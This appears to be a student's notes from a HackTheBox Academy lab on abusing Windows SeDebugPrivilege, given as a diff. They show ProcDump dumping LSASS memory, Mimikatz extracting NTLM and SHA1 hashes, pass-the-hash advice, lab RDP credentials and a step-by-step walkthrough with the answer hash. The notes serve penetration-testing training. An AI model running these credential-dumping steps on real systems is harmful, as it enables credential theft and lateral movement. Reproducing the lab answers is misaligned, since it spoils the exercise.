@@ -1,1 +1,119 @@
+To run a particular application or service or assist with troubleshooting, a user might be assigned the SeDebugPrivilege instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under Computer Settings > Windows Settings > Security Settings. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their day-to-day job. This user right should be given out sparingly because any account that is assigned it will have access to critical operating system components.
 
+During an internal penetration test, it is often helpful to use websites such as LinkedIn to gather information about potential users to target. Suppose we are, for example, retrieving many NTLMv2 password hashes using Responder or Inveigh. In that case, we may want to focus our password hash cracking efforts on possible high-value accounts, such as developers who are more likely to have these types of privileges assigned to their accounts.
+
+A user may not be a local admin on a host but have rights that we cannot enumerate remotely using a tool such as BloodHound. This would be worth checking in an environment where we obtain credentials for several users and have RDP access to one or more hosts but no additional privileges.
+
+Syntax: C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeDebugPrivilege                          Debug programs                                                     Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+
+We can use ProcDump from the SysInternals suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service (LSASS) process, which stores user credentials after a user logs on to a system.
+
+SYNTAX: C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp
+
+ProcDump v10.0 - Sysinternals process dump utility
+Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
+Sysinternals - www.sysinternals.com
+
+[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
+[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
+[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
+[15:25:46] Dump count reached.
+
+** This is successful, and we can load this in Mimikatz using the sekurlsa::minidump command. After issuing the sekurlsa::logonPasswords commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations). ** 
+
+Note: It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.
+
+SYNTAX: C:\htb> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # log
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::minidump lsass.dmp
+Switch to MINIDUMP : 'lsass.dmp'
+
+mimikatz # sekurlsa::logonpasswords
+Opening : 'lsass.dmp' file for minidump...
+
+Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
+Session           : Interactive from 4
+User Name         : DWM-4
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/31/2021 3:00:57 PM
+SID               : S-1-5-90-0-4
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WINLPE-SRV01$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+<SNIP> 
+
+Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
+Session           : RemoteInteractive from 2
+User Name         : jordan
+Domain            : WINLPE-SRV01
+Logon Server      : WINLPE-SRV01
+Logon Time        : 3/31/2021 2:59:52 PM
+SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
+        msv :
+         [00000003] Primary
+         * Username : jordan
+         * Domain   : WINLPE-SRV01
+         * NTLM     : cf3a5525ee9414229e66279623ed5c58
+         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
+        tspkg :
+        wdigest :
+         * Username : jordan
+         * Domain   : WINLPE-SRV01
+         * Password : (null)
+        kerberos :
+         * Username : jordan
+         * Domain   : WINLPE-SRV01
+         * Password : (null)
+        ssp :
+        credman :
+
+<SNIP>
+
+
+CHALLENGE: RDP to 10.129.97.23 (ACADEMY-WINLPE-SRV01) with user "jordan" and password "HTB_@cademy_j0rdan!"
+
+Question 1 -  Leverage SeDebugPrivilege rights and obtain the NTLM password hash for the sccm_svc account. -  64f12cddaa88057e06a81b54e73b949b
+
+1) xfreerdp /v:10.129.97.23 /u:jordan /p:HTB_@cademy_j0rdan! 
+2) cmd as admin
+3) cd tools\Procdump 
+4) procdump.exe -accepteula -ma lsass.exe lsass.dmp
+5) open file explorer and move or copy the .dmp file to c:\tools\mimikatz\x64
+6) cd C:\tools\mimikatz\x64
+7) mimikatz.exe
+8) log
+9) sekurlsa::minidump lsass.dmp
+10) sekurlsa::logonpasswords
+11) go through output and find -> msv :
+         [00000006] Primary
+         * Username : sccm_svc
+         * Domain   : WINLPE-SRV01
+         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
+         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
